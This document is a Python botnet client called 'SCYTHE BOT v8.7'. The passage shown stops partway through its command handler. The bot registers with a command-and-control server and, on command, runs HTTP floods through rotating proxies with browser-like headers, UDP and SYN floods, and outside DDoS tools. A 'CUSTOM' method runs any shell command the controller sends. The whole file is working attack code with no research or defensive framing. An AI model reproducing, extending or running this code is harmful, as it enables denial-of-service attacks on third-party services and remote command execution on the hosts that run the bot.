#!/usr/bin/env python3
"""
SCYTHE BOT v8.7 — C2 SYNC FIX + PROXY DEATH LOOP FIX + WORKER LOGGING
Fixes:
- Command parsing: handle 'type' + 'cmd' fields correctly
- Worker logging: show active workers every 5s
- Proxy refresh request: auto-request from C2 when pool empty
- Reconnect: re-register with attack sync request
"""

import socket
import subprocess
import time
import sys
import json
import threading
import os
import random
import configparser
import signal
import logging
from datetime import datetime
from logging.handlers import RotatingFileHandler
from collections import defaultdict

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
os.makedirs(os.path.join(SCRIPT_DIR, 'logs'), exist_ok=True)
os.makedirs(os.path.join(SCRIPT_DIR, 'data'), exist_ok=True)

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    import requests
    from requests.adapters import HTTPAdapter
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[ERROR] requests not installed! Run: pip install requests[socks] psutil")
    sys.exit(1)

try:
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    pass

LOG_FILE = os.path.join(SCRIPT_DIR, 'logs', 'bot.log')
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    handlers=[
        RotatingFileHandler(LOG_FILE, maxBytes=10*1024*1024, backupCount=5, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('scythe_bot')

_shutdown_event = threading.Event()

def signal_handler(signum, frame):
    logger.info("🛑 Received signal {}, shutting down gracefully...".format(signum))
    _shutdown_event.set()

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# ========== THREAD-SAFE SOCKET ==========
_sock_lock = threading.Lock()
_current_sock = None

def set_current_sock(sock):
    global _current_sock
    _current_sock = sock

def get_current_sock():
    return _current_sock

def check_and_adjust_limits(desired_threads):
    try:
        import resource
        soft_nofile, hard_nofile = resource.getrlimit(resource.RLIMIT_NOFILE)
        soft_nproc, hard_nproc = resource.getrlimit(resource.RLIMIT_NPROC)
        min_fd_needed = desired_threads * 4 + 100
        min_proc_needed = desired_threads + 200
        adjusted_threads = desired_threads
        if soft_nofile < min_fd_needed:
            logger.warning("⚠️ ulimit -n ({}) too low. Auto-reducing threads.".format(soft_nofile))
            adjusted_threads = max(10, (soft_nofile - 100) // 4)
        else:
            logger.info("✅ ulimit -n: {} (OK for {} threads)".format(soft_nofile, desired_threads))
        if soft_nproc < min_proc_needed:
            logger.warning("⚠️ ulimit -u ({}) too low.".format(soft_nproc))
            adjusted_threads = min(adjusted_threads, max(10, soft_nproc - 200))
        else:
            logger.info("✅ ulimit -u: {} (OK)".format(soft_nproc))
        if adjusted_threads != desired_threads:
            logger.warning("🔧 Auto-adjusted threads: {} → {}".format(desired_threads, adjusted_threads))
        return adjusted_threads
    except ImportError:
        return desired_threads

config = configparser.ConfigParser()
config.read(os.path.join(SCRIPT_DIR, "config.ini"))

C2_IP = config.get("C2", "IP", fallback="127.0.0.1")
C2_PORT = config.getint("C2", "PORT", fallback=4884)
BOT_ID = config.get("C2", "ID", fallback=socket.gethostname())
RAW_THREADS = config.getint("C2", "THREADS", fallback=150)
RPS_LIMIT = config.getint("C2", "RPS_LIMIT", fallback=1500)
BANDWIDTH_LIMIT_MB = config.getint("C2", "BANDWIDTH_LIMIT_MB", fallback=0)

DIRECT_FALLBACK = config.getboolean("C2", "DIRECT_FALLBACK", fallback=True)
PROXY_REFRESH_ON_EMPTY = config.getboolean("C2", "PROXY_REFRESH_ON_EMPTY", fallback=True)

BOT_ID = BOT_ID.strip()
if not BOT_ID or BOT_ID.lower() == "auto":
    BOT_ID = socket.gethostname()

if len(sys.argv) > 1:
    C2_IP = sys.argv[1]
if len(sys.argv) > 2:
    C2_PORT = int(sys.argv[2])
if len(sys.argv) > 3:
    BOT_ID = sys.argv[3].strip()
    if not BOT_ID or BOT_ID.lower() == "auto":
        BOT_ID = socket.gethostname()

THREADS = check_and_adjust_limits(RAW_THREADS)

proxy_list = []
current_attacks = {}
stop_event = threading.Event()
heartbeat_interval = 5
reconnect_delay = 5
max_reconnect_delay = 60
read_buffer = ""

class WorkerStats:
    def __init__(self, worker_id):
        self.worker_id = worker_id
        self.requests = 0
        self.success = 0
        self.errors = 0
        self.proxy_errors = 0
        self.current_proxy = None
        self.rps = 0
        self.last_update = time.time()
        self._lock = threading.Lock()

    def add_request(self, success=False, proxy_error=False):
        with self._lock:
            self.requests += 1
            if success:
                self.success += 1
            else:
                self.errors += 1
            if proxy_error:
                self.proxy_errors += 1

    def update_rps(self):
        with self._lock:
            now = time.time()
            elapsed = now - self.last_update
            if elapsed >= 1.0:
                self.rps = int(self.requests / elapsed)
                self.requests = 0
                self.last_update = now

    def get_stats(self):
        with self._lock:
            return {
                "worker_id": self.worker_id,
                "requests": self.requests,
                "success": self.success,
                "errors": self.errors,
                "proxy_errors": self.proxy_errors,
                "current_proxy": self.current_proxy,
                "rps": self.rps,
            }

class ProxyPool:
    def __init__(self, proxies):
        self._all_proxies = list(proxies) if proxies else []
        self._alive = list(self._all_proxies)
        self._dead = set()
        self._fail_counts = {}
        self._lock = threading.Lock()
        self._index = 0
        self._refresh_count = 0
        self._total_used = 0
        self._last_refresh_request = 0

    @property
    def count(self):
        with self._lock:
            return len(self._alive)

    @property
    def total(self):
        with self._lock:
            return len(self._all_proxies)

    @property
    def dead_count(self):
        with self._lock:
            return len(self._dead)

    def refresh(self, new_proxies):
        with self._lock:
            old_count = len(self._alive)
            added = 0
            for p in new_proxies:
                if p not in self._all_proxies and p not in self._dead:
                    self._all_proxies.append(p)
                    self._alive.append(p)
                    added += 1
            self._refresh_count += 1
            new_count = len(self._alive)
            logger.info("[PROXY] Pool refreshed: {} → {} alive (+{} new)".format(
                old_count, new_count, added))

    def get_next(self):
        with self._lock:
            if not self._alive:
                return None
            proxy = self._alive[self._index % len(self._alive)]
            self._index += 1
            self._total_used += 1
            return proxy

    def mark_dead(self, proxy_url, max_failures=5):
        with self._lock:
            if proxy_url not in self._fail_counts:
                self._fail_counts[proxy_url] = 0
            self._fail_counts[proxy_url] += 1
            if self._fail_counts[proxy_url] >= max_failures:
                if proxy_url in self._alive:
                    self._alive.remove(proxy_url)
                    self._dead.add(proxy_url)
                    logger.warning("[PROXY] {}... DEAD (alive:{}, dead:{})".format(
                        proxy_url[:50], len(self._alive), len(self._dead)))

    def mark_alive(self, proxy_url):
        with self._lock:
            self._fail_counts[proxy_url] = 0

    def get_stats(self):
        with self._lock:
            return {
                "alive": len(self._alive),
                "dead": len(self._dead),
                "total": len(self._all_proxies),
                "total_used": self._total_used,
                "refresh_count": self._refresh_count,
            }

    def should_request_refresh(self):
        with self._lock:
            if len(self._alive) == 0 and len(self._all_proxies) > 0:
                now = time.time()
                if now - self._last_refresh_request > 30:
                    self._last_refresh_request = now
                    return True
            return False

def format_proxy(proxy_url):
    if not proxy_url:
        return None
    proxy_url = proxy_url.strip()
    if proxy_url.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return {'http': proxy_url, 'https': proxy_url}
    formatted = 'http://{}'.format(proxy_url)
    return {'http': formatted, 'https': formatted}

def log(msg, level=logging.INFO):
    logger.log(level, "[{}] {}".format(BOT_ID, msg))

def connect_to_c2():
    global reconnect_delay
    while not _shutdown_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            try:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 10)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
            except:
                pass
            s.connect((C2_IP, C2_PORT))
            log("✅ Connected to C2!")
            set_current_sock(s)
            with _sock_lock:
                s.sendall(json.dumps({"type": "register", "id": BOT_ID, "threads": THREADS, "rps_limit": RPS_LIMIT}).encode('utf-8') + b"\n")
                s.sendall(json.dumps({"type": "heartbeat", "id": BOT_ID, "time": int(time.time())}).encode('utf-8') + b"\n")
            log("📤 Initial register + heartbeat sent")
            reconnect_delay = 5
            return s
        except Exception as e:
            log("❌ Connection failed: {}. Retry in {}s...".format(e, reconnect_delay), logging.WARNING)
            time.sleep(reconnect_delay + random.uniform(0, 2))
            if reconnect_delay < max_reconnect_delay:
                reconnect_delay = min(reconnect_delay * 1.5, max_reconnect_delay)
    return None

def send_report(sock, report):
    try:
        data = json.dumps(report).encode('utf-8') + b"\n"
        if len(data) > 8192:
            chunk_size = 4096
            with _sock_lock:
                for i in range(0, len(data), chunk_size):
                    sock.sendall(data[i:i+chunk_size])
                    time.sleep(0.01)
        else:
            with _sock_lock:
                sock.sendall(data)
        return True
    except Exception as e:
        log("📤 Send report error: {}".format(e), logging.WARNING)
        return False

# ========== HEARTBEAT THREAD ==========
_heartbeat_thread = None
_heartbeat_stop = threading.Event()

def heartbeat_loop(sock):
    """Dedicated thread for sending heartbeats every 5 seconds."""
    while not _heartbeat_stop.is_set() and not _shutdown_event.is_set():
        time.sleep(heartbeat_interval)
        if _heartbeat_stop.is_set() or _shutdown_event.is_set():
            break
        with _sock_lock:
            hb_result = send_report(sock, {"type": "heartbeat", "id": BOT_ID, "time": time.time()})
        if hb_result:
            log("💓 Heartbeat sent to C2")
        else:
            log("⚠️ Heartbeat failed, will reconnect...")
            break

class HybridRateLimiter:
    def __init__(self, rate_per_second):
        self.rate = float(rate_per_second)
        self.tokens = 0.0
        self.last_update = time.time()
        self.lock = threading.Lock()
        self.interval = 1.0 / self.rate if self.rate > 0 else 0

    def acquire(self):
        if self.rate <= 0:
            return True
        with self.lock:
            now = time.time()
            elapsed = now - self.last_update
            self.tokens = min(self.rate, self.tokens + elapsed * self.rate)
            self.last_update = now
            if self.tokens >= 1.0:
                self.tokens -= 1.0
                return True
            sleep_time = (1.0 - self.tokens) / self.rate
            return sleep_time

class AttackEngine(threading.Thread):
    def __init__(self, attack_id, method, target, port, duration, hold_time, extra, rps_limit, proxies, sock):
        super().__init__(daemon=True)
        self.attack_id = attack_id
        self.method = method.upper()
        self.target = target
        self.port = port
        self.duration = duration
        self.hold_time = hold_time or 0
        self.extra = extra
        self.rps_limit = rps_limit
        self.proxies = proxies if proxies else []
        self.sock = sock
        self.stop_flag = threading.Event()
        self.rps_update_event = threading.Event()
        self._lock = threading.Lock()
        self._total_requests = 0
        self._success_requests = 0
        self._proxy_requests = 0
        self._direct_requests = 0
        self._proxy_refresh_count = 0
        self.start_time = None
        self.thread_count = 0
        self._last_reported_total = 0
        self._net_io_start = None
        self.proxy_pool = None
        self.worker_stats = {}
        self._crashed = False
        self._crash_reason = ""

    @property
    def total_requests(self):
        with self._lock:
            return self._total_requests

    @property
    def success_requests(self):
        with self._lock:
            return self._success_requests

    @property
    def proxy_requests(self):
        with self._lock:
            return self._proxy_requests

    @property
    def direct_requests(self):
        with self._lock:
            return self._direct_requests

    def _inc_total(self):
        with self._lock:
            self._total_requests += 1

    def _inc_success(self):
        with self._lock:
            self._success_requests += 1

    def _inc_proxy(self):
        with self._lock:
            self._proxy_requests += 1

    def _inc_direct(self):
        with self._lock:
            self._direct_requests += 1

    def update_rps(self, new_rps_limit):
        self.rps_limit = new_rps_limit
        self.rps_update_event.set()
        log("[ENGINE] 🔄 RPS updated to {} for attack {}".format(new_rps_limit, self.attack_id))

    def update_proxies(self, new_proxies):
        if self.proxy_pool and new_proxies:
            self.proxy_pool.refresh(new_proxies)
            self._proxy_refresh_count += 1
            log("[ENGINE] 🔄 Proxy pool refreshed mid-attack (#{})".format(self._proxy_refresh_count))

    def run(self):
        self.start_time = time.time()
        if PSUTIL_AVAILABLE:
            self._net_io_start = psutil.net_io_counters()
        end_time = self.start_time + self.duration + self.hold_time
        self.proxy_pool = ProxyPool(self.proxies)

        log("[ENGINE] 🚀 Attack {} started | Method: {} | Target: {} | Threads: {} | RPS/Bot: {} | Proxies: {} (alive: {}) | Duration: {}s | Hold: {}s".format(
            self.attack_id, self.method, self.target, THREADS, self.rps_limit, 
            self.proxy_pool.total, self.proxy_pool.count, self.duration, self.hold_time))

        send_report(self.sock, {
            "type": "attack_started",
            "id": BOT_ID,
            "attack_id": self.attack_id,
            "proxies_count": self.proxy_pool.total,
            "proxies_alive": self.proxy_pool.count,
            "threads": THREADS,
            "rps_limit": self.rps_limit,
        })

        progress_thread = threading.Thread(target=self._progress_reporter, daemon=True)
        progress_thread.start()

        # FIX: Start worker status reporter
        worker_status_thread = threading.Thread(target=self._worker_status_reporter, daemon=True)
        worker_status_thread.start()

        try:
            if self.method in ["SPECTRE", "VORTEX", "TITAN", "PHANTOM", "SERPENT", "STORM"]:
                self._run_layer7(end_time)
            elif self.method in ["OBLIVION", "CHAOS", "ANNIHILATOR", "GHOST", "UDP"]:
                self._run_layer4(end_time)
            elif self.method == "SYN":
                self._run_syn(end_time)
            elif self.method == "SCYTHE":
                self._run_external("python3 /root/SCYTHE/attack.py {} {} {} {}".format(
                    self.extra, self.target, self.port, self.duration + self.hold_time))
            elif self.method == "MHDDOS":
                self._run_external("python3 /root/MHDDOS/start.py {} {} {} {}".format(
                    self.extra, self.target, self.port, self.duration + self.hold_time))
            elif self.method == "CUSTOM":
                self._run_external(self.extra)
            else:
                log("[ENGINE] ❌ Unknown method: {}".format(self.method))
                self._crashed = True
                self._crash_reason = "Unknown method: {}".format(self.method)
        except Exception as e:
            self._crashed = True
            self._crash_reason = str(e)
            log("[ENGINE] 💥 CRITICAL ERROR: {}".format(e), logging.ERROR)
            import traceback
            log("[ENGINE] Traceback: {}".format(traceback.format_exc()), logging.ERROR)
        finally:
            self.stop_flag.set()
            progress_thread.join(timeout=2)
            worker_status_thread.join(timeout=2)
            elapsed = max(1, time.time() - self.start_time) if self.start_time else 1
            final_rps = self.total_requests // elapsed
            log("[ENGINE] ✅ Attack {} finished | Total: {} | Success: {} | Proxy: {} | Direct: {} | Avg RPS: {} | Crashed: {}".format(
                self.attack_id, self.total_requests, self.success_requests, self.proxy_requests, 
                self.direct_requests, final_rps, self._crashed))
            self._send_final_report(final_rps)

    def _send_final_report(self, final_rps):
        worker_summary = []
        for wid, stats in self.worker_stats.items():
            s = stats.get_stats()
            worker_summary.append("W{}:{}ok/{}err/{}pxerr".format(
                wid, s['success'], s['errors'], s['proxy_errors']))

        max_workers = 50
        if len(worker_summary) > max_workers:
            worker_summary = worker_summary[:max_workers] + ["...and {} more workers".format(
                len(worker_summary) - max_workers)]

        report = {
            "type": "attack_result",
            "id": BOT_ID,
            "attack_id": self.attack_id,
            "method": self.method,
            "target": self.target,
            "port": self.port,
            "duration": self.duration,
            "hold_time": self.hold_time,
            "status": "error" if self._crashed else ("success" if self.success_requests > 0 else "completed"),
            "total_requests": self.total_requests,
            "success_requests": self.success_requests,
            "proxy_requests": self.proxy_requests,
            "direct_requests": self.direct_requests,
            "proxy_refresh_count": self._proxy_refresh_count,
            "rps": final_rps,
            "worker_summary": worker_summary,
            "output": "Total: {} | Success: {} | Proxy: {} | Direct: {} | Refreshes: {} | RPS: {} | Workers: {}".format(
                self.total_requests, self.success_requests, self.proxy_requests, self.direct_requests,
                self._proxy_refresh_count, final_rps, ' | '.join(worker_summary[:10])),
            "error": self._crash_reason if self._crashed else None,
        }
        send_report(self.sock, report)
        log("[ATTACK] 📤 FINAL REPORT sent for {}".format(self.attack_id))

    def _progress_reporter(self):
        while not self.stop_flag.is_set():
            time.sleep(5)
            if self.stop_flag.is_set():
                break
            current_total = self.total_requests
            delta = current_total - self._last_reported_total
            self._last_reported_total = current_total
            elapsed = max(1, time.time() - self.start_time) if self.start_time else 1
            current_rps = delta // 5 if delta > 0 else 0
            worker_logs = []
            for wid, stats in self.worker_stats.items():
                stats.update_rps()
                s = stats.get_stats()
                worker_logs.append("W{}:{}rps/{}ok/{}err".format(
                    wid, s['rps'], s['success'], s['errors']))
            bw_sent_mb = 0
            bw_recv_mb = 0
            cpu_percent = 0
            mem_percent = 0
            if PSUTIL_AVAILABLE and self._net_io_start:
                net_now = psutil.net_io_counters()
                bw_sent_mb = (net_now.bytes_sent - self._net_io_start.bytes_sent) / 1024 / 1024
                bw_recv_mb = (net_now.bytes_recv - self._net_io_start.bytes_recv) / 1024 / 1024
                cpu_percent = psutil.cpu_percent(interval=0.1)
                mem = psutil.virtual_memory()
                mem_percent = mem.percent
            proxy_stats = self.proxy_pool.get_stats() if self.proxy_pool else {}
            report = {
                "type": "attack_progress",
                "id": BOT_ID,
                "attack_id": self.attack_id,
                "delta_requests": delta,
                "total_requests": current_total,
                "current_rps": current_rps,
                "success_requests": self.success_requests,
                "proxy_requests": self.proxy_requests,
                "direct_requests": self.direct_requests,
                "proxy_refresh_count": self._proxy_refresh_count,
                "proxy_pool_alive": proxy_stats.get("alive", 0),
                "proxy_pool_dead": proxy_stats.get("dead", 0),
                "bandwidth_sent_mb": round(bw_sent_mb, 2),
                "bandwidth_recv_mb": round(bw_recv_mb, 2),
                "cpu_percent": cpu_percent,
                "mem_percent": mem_percent,
                "worker_stats": worker_logs[:20],
            }
            send_report(self.sock, report)
            log("[PROGRESS] ⏱️ +{}req | Total:{} | RPS:{} | Success:{} | Proxy:{} | Pool:{}a/{}d | Workers: {} | BW:{}MB↑/{}MB↓ | CPU:{}%".format(
                delta, current_total, current_rps, self.success_requests, self.proxy_requests,
                proxy_stats.get('alive',0), proxy_stats.get('dead',0), ' | '.join(worker_logs[:5]),
                bw_sent_mb, bw_recv_mb, cpu_percent))

    def _worker_status_reporter(self):
        """FIX: Log worker status every 3 seconds so user can see activity."""
        while not self.stop_flag.is_set():
            time.sleep(3)
            if self.stop_flag.is_set():
                break
            active_workers = len([w for w in self.worker_stats.values() if w.rps > 0])
            total_rps = sum(w.rps for w in self.worker_stats.values())
            total_success = sum(w.success for w in self.worker_stats.values())
            total_errors = sum(w.errors for w in self.worker_stats.values())

            if active_workers > 0:
                log("[WORKERS] {} active | {} RPS | {} success | {} errors | {} proxies alive".format(
                    active_workers, total_rps, total_success, total_errors,
                    self.proxy_pool.count if self.proxy_pool else 0))

    def _run_layer7(self, end_time):
        self.thread_count = THREADS
        if self.proxy_pool.count == 0 and self.proxy_pool.total == 0:
            if DIRECT_FALLBACK:
                log("[ENGINE] ⚠️ No proxies at all. Running with DIRECT CONNECTION fallback.")
            else:
                log("[ENGINE] ❌ No proxies at all. Attack aborted.")
                return
        if self.proxy_pool.count == 0 and self.proxy_pool.total > 0:
            log("[ENGINE] ⚠️ NO ALIVE PROXIES! Using all {} proxies anyway.".format(self.proxy_pool.total))
        rps_per_thread = self.rps_limit / self.thread_count if self.rps_limit > 0 else 0
        log("[ENGINE] 🚀 Starting {} L7 workers | Rate: {:.3f} RPS/thread | Total target: {} RPS | PROXY-FIRST | 12H STABLE".format(
            self.thread_count, rps_per_thread, self.rps_limit))
        threads = []
        for i in range(self.thread_count):
            limiter = HybridRateLimiter(rps_per_thread)
            stats = WorkerStats(i)
            self.worker_stats[i] = stats
            t = threading.Thread(target=self._l7_worker, args=(end_time, i, limiter, stats), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join(timeout=max(0, end_time - time.time()))

    def _l7_worker(self, end_time, worker_id, limiter, stats):
        session = requests.Session()
        adapter = HTTPAdapter(pool_connections=1, pool_maxsize=5, max_retries=0)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:127.0) Gecko/20100101 Firefox/127.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
        ]
        session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
        })
        req_count = 0
        err_count = 0
        proxy_failures = 0
        consecutive_proxy_fails = 0
        current_proxy = None
        current_proxy_formatted = None
        has_proxies = self.proxy_pool.total > 0
        direct_mode = not has_proxies and DIRECT_FALLBACK

        if not has_proxies and not DIRECT_FALLBACK:
            log("[W{}] ❌ No proxies available. Worker idle.".format(worker_id))
            return

        log("[W{}] 🚀 Worker started | Target: {} | RPS limit: {} | Mode: {}".format(
            worker_id, self.target, self.rps_limit, 'DIRECT' if direct_mode else 'PROXY'))

        last_worker_heartbeat = time.time()
        last_status_log = time.time()

        while time.time() < end_time and not self.stop_flag.is_set() and not _shutdown_event.is_set():
            # Emergency heartbeat every 10s from worker thread
            if time.time() - last_worker_heartbeat > 10:
                last_worker_heartbeat = time.time()
                try:
                    send_report(self.sock, {"type": "worker_heartbeat", "id": BOT_ID, "attack_id": self.attack_id, "worker_id": worker_id, "time": time.time()})
                except:
                    pass

            # Request proxy refresh if pool is empty
            if self.proxy_pool.should_request_refresh() and PROXY_REFRESH_ON_EMPTY:
                try:
                    send_report(self.sock, {"type": "proxy_refresh_request", "id": BOT_ID, "attack_id": self.attack_id, "reason": "all_proxies_dead"})
                    log("[W{}] 📤 Requested proxy refresh from C2".format(worker_id))
                except:
                    pass

            if self.rps_update_event.is_set():
                self.rps_update_event.clear()
                new_rps_per_thread = self.rps_limit / self.thread_count if self.rps_limit > 0 else 0
                limiter.rate = float(new_rps_per_thread)
                limiter.interval = 1.0 / limiter.rate if limiter.rate > 0 else 0
                log("[W{}] 🔄 RPS limit updated to {} ({:.3f}/thread)".format(
                    worker_id, self.rps_limit, new_rps_per_thread))

            result = limiter.acquire()
            if result is not True:
                sleep_time = result
                if sleep_time > 0.001:
                    time.sleep(sleep_time)
                continue

            if not direct_mode:
                if current_proxy is None or consecutive_proxy_fails >= 3:
                    current_proxy = self.proxy_pool.get_next()
                    if current_proxy:
                        current_proxy_formatted = format_proxy(current_proxy)
                        consecutive_proxy_fails = 0
                        proxy_failures = 0
                        stats.current_proxy = current_proxy
                        if req_count % 50 == 0:
                            log("[W{}] 🔄 Switched to proxy: {}...".format(
                                worker_id, current_proxy[:50]))
                    else:
                        log("[W{}] ⚠️ All proxies dead. Retrying in 0.5s... | Pool: {}a/{}d".format(
                            worker_id, self.proxy_pool.count, self.proxy_pool.dead_count))
                        time.sleep(0.5)

                        if DIRECT_FALLBACK and consecutive_proxy_fails >= 10:
                            log("[W{}] 🔄 Switching to DIRECT mode after 10 proxy failures".format(worker_id))
                            direct_mode = True
                            current_proxy = None
                            current_proxy_formatted = None
                        continue

            try:
                if direct_mode:
                    resp = session.get(
                        self.target,
                        timeout=(4, 6),
                        verify=False,
                        allow_redirects=False,
                        stream=True,
                    )
                    self._inc_total()
                    self._inc_direct()
                    stats.add_request(success=True)
                    if resp.status_code < 400:
                        self._inc_success()
                        consecutive_proxy_fails = 0
                    else:
                        consecutive_proxy_fails += 1
                        stats.add_request(success=False)
                else:
                    resp = session.get(
                        self.target,
                        timeout=(4, 6),
                        verify=False,
                        proxies=current_proxy_formatted,
                        allow_redirects=False,
                        stream=True,
                    )
                    resp.close()
                    self._inc_total()
                    self._inc_proxy()
                    stats.add_request(success=True)
                    if resp.status_code < 400:
                        self._inc_success()
                        self.proxy_pool.mark_alive(current_proxy)
                        consecutive_proxy_fails = 0
                    else:
                        consecutive_proxy_fails += 1
                        stats.add_request(success=False)

                req_count += 1
                if req_count % 100 == 0:
                    log("[W{}] 📊 {} reqs | Success: {} | Errors: {} | Proxy: {}...".format(
                        worker_id, req_count, stats.success, stats.errors,
                        current_proxy[:40] if current_proxy else 'DIRECT'))

                # FIX: Log status every 30 seconds
                if time.time() - last_status_log > 30:
                    last_status_log = time.time()
                    log("[W{}] ⏱️ Status: {} total reqs | {} success | {} errors | {} proxy_err | current: {}".format(
                        worker_id, req_count, stats.success, stats.errors, stats.proxy_errors,
                        current_proxy[:30] if current_proxy else 'DIRECT'))

            except requests.exceptions.ProxyError as e:
                err_count += 1
                proxy_failures += 1
                consecutive_proxy_fails += 1
                stats.add_request(proxy_error=True)
                self.proxy_pool.mark_dead(current_proxy, max_failures=5)
                if err_count <= 5 or err_count % 50 == 0:
                    log("[W{}] ❌ ProxyError: {}... | Failures: {}".format(
                        worker_id, current_proxy[:40] if current_proxy else 'DIRECT', proxy_failures))
                current_proxy = None
                current_proxy_formatted = None
                stats.current_proxy = None

                if DIRECT_FALLBACK and consecutive_proxy_fails >= 10:
                    log("[W{}] 🔄 Switching to DIRECT mode after 10 consecutive proxy failures".format(worker_id))
                    direct_mode = True

            except requests.exceptions.Timeout:
                self._inc_total()
                err_count += 1
                consecutive_proxy_fails += 1
                stats.add_request(success=False)
                if consecutive_proxy_fails >= 5:
                    if not direct_mode and current_proxy:
                        self.proxy_pool.mark_dead(current_proxy, max_failures=8)
                        if err_count <= 5:
                            log("[W{}] ⚠️ Proxy timeout 5x: {}... marked dead".format(
                                worker_id, current_proxy[:40]))
                    current_proxy = None
                    current_proxy_formatted = None
                    stats.current_proxy = None

            except requests.exceptions.ConnectionError as e:
                self._inc_total()
                err_count += 1
                consecutive_proxy_fails += 1
                stats.add_request(proxy_error=True)
                if not direct_mode and current_proxy:
                    self.proxy_pool.mark_dead(current_proxy, max_failures=5)
                if err_count <= 5:
                    log("[W{}] ❌ ConnectionError: {}... | Failures: {}".format(
                        worker_id, current_proxy[:40] if current_proxy else 'DIRECT', consecutive_proxy_fails))
                current_proxy = None
                current_proxy_formatted = None
                stats.current_proxy = None

            except Exception as e:
                err_count += 1
                consecutive_proxy_fails += 1
                stats.add_request(success=False)
                if err_count <= 3:
                    log("[W{}] ⚠️ Error: {}".format(worker_id, e))
                if consecutive_proxy_fails >= 3:
                    current_proxy = None
                    current_proxy_formatted = None
                    stats.current_proxy = None

        log("[W{}] ✅ Finished | Requests: {} | Success: {} | Errors: {} | ProxyErrors: {}".format(
            worker_id, req_count, stats.success, stats.errors, stats.proxy_errors))

    def _run_layer4(self, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_data = random._urandom(65500)
            while time.time() < end_time and not self.stop_flag.is_set() and not _shutdown_event.is_set():
                try:
                    sock.sendto(bytes_data, (self.target, self.port))
                    self._inc_total()
                    self._inc_success()
                except:
                    pass
        except Exception as e:
            log("[ENGINE] L4 error: {}".format(e))

    def _run_syn(self, end_time):
        cmd = 'python3 -c "from scapy.all import *; send(IP(dst=\'{}\')/TCP(dport={}, flags=\'S\'), count=10000, inter=0.001, verbose=0)"'.format(
            self.target, self.port)
        self._run_external(cmd)

    def _run_external(self, cmd):
        try:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = proc.communicate(timeout=self.duration + self.hold_time + 5)
            log("[ENGINE] External cmd finished | rc={}".format(proc.returncode))
        except subprocess.TimeoutExpired:
            proc.kill()
            log("[ENGINE] External cmd timed out")
        except Exception as e:
            log("[ENGINE] External cmd error: {}".format(e))

    def stop(self):
        self.stop_flag.set()

def handle_command(sock, cmd_json):
    global proxy_list, _heartbeat_thread, _heartbeat_stop
    try:
        data = json.loads(cmd_json)

        # FIX: Better command parsing - handle both 'type' and 'cmd' fields
        msg_type = data.get("type", "").lower()
        cmd = data.get("cmd", "").lower()

        # If type is 'command', use cmd field
        if msg_type == "command" and cmd:
            pass  # cmd already set
        elif msg_type in ["attack", "stop", "proxy_refresh", "update_rps", "proxy_update", "exit", "ping"]:
            cmd = msg_type
        elif not cmd and not msg_type:
            log("❓ Unknown command format: {}".format(cmd_json[:200]), logging.WARNING)
            return

        log("📩 RAW COMMAND: type={}, cmd={}, keys={}, raw={}".format(
            msg_type, cmd, list(data.keys()), cmd_json[:200]))

        if cmd == "ping":
            send_report(sock, {"type": "pong", "id": BOT_ID, "time": time.time()})
            log("📤 Sent pong to C2")

        elif cmd == "attack":
            attack_id = data.get("attack_id", str(time.time()))
            method = data.get("method")
            target = data.get("target")
            port = data.get("port", 80)
            duration = data.get("duration", 60)
            hold_time = data.get("hold_time", 0) or 0
            extra = data.get("extra", "")
            rps_limit = data.get("rps_limit", RPS_LIMIT)
            if rps_limit <= 0:
                rps_limit = RPS_LIMIT
            attack_proxies = data.get("proxies", [])
            if attack_proxies:
                proxy_list = attack_proxies
                log("[ATTACK] 📦 Received {} proxies from C2".format(len(attack_proxies)))
            active_proxies = attack_proxies if attack_proxies else proxy_list
            if not active_proxies:
